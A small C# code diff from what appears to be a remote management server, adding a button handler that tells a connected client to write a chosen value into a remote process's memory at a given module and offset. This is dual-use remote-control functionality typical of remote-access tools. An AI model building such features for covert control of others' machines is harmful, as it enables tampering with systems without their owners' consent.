@@ -47,7 +47,8 @@ namespace MLManagementServer.Forms
 
         private void button1_Click(object sender, EventArgs e)
         {
-            
+            Client.Send((byte)NetworkCommand.TaskManager, (byte)TaskManagerCommand.WriteMemory, ProcessID, cbModules.Text, (int)nudOffset.Value, (int)nudValue.Value);
+            DialogResult = DialogResult.OK;
         }
 
         private void button2_Click(object sender, EventArgs e)
